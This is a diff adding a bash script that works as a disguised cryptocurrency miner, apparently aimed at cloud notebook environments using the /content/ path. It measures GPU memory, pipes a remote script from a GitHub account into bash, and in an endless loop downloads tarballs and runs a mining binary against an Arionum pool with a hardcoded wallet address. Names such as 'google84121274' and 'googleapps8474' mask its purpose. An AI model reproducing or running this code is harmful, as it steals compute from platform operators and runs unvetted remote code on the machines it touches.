@@ -1,0 +1,129 @@
+apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+
+apt-get install -y bc
+
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+arr[0]="http://port.aro.wellgitu.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+if [[ $google84121274 == *"failed"* ]]; then
+
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
+
+else
+
+while true
+do
+
+arr[5]="28xqj4rxaoBfMeHnCb9gS9t3ezWMvPZ34qYhD4Tu5iSZhEpc3Q6cZYWowgyLuSqsAnbsy2Dw3cNjWR3A6WMnGoa2"
+rand=$[$RANDOM % ${#arr[@]}]
+google84121212121212121274=${arr[0]}
+
+google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+string=$(curl -s -A "miner" http://mine.arionumpool.com/mine.php?q=info)
+if [[ $string == *"16384"* ]]; then
+
+cd /content/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/devdeploy84.tar.gz
+tar -xvf ./devdeploy84.tar.gz
+
+cd googleapps8474
+
+count=$(echo "$google84121274 - 400"|bc)
+googlelinux84=$(echo "$count / 16384"|bc -l)
+linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
+googlelinux8474=${linuxgoogle84%.*}
+
+timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+
+
+else
+
+cd /content/
+
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux847412741274.tar.gz
+tar -xvf ./linux847412741274.tar.gz
+
+cd googleapps8474
+
+google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
+
+google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+if (($google84 >= 14884 && $google84 <= 16884));
+then
+
+timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 22
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 10884 && $google84 <= 14882));
+then
+
+timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 18
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 5288 && $google84 <= 9184));
+then
+
+timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 10
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 2874 && $google84 <= 5184));
+then
+
+timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 6
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 1884 && $google84 <= 2488));
+then
+
+timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 2
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+
+
+fi
+
+done
+
+fi
